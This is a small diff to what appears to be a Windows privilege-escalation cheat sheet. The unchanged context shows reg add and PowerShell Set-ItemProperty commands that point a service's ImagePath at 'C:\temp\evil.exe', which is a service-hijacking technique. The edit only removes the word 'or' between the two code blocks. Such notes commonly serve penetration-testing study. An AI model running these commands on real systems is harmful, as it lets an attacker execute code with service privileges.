@@ -148,8 +148,6 @@ reg query HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath
 reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath /d "C:\temp\evil.exe"
 ```
 
-or
-
 ```pwsh
 Set-ItemProperty -Path "hklm:\System\CurrentControlSet\services\SomeSoftwareName" -Name "ImagePath" -Value "C:\temp\evil.exe"
 ```
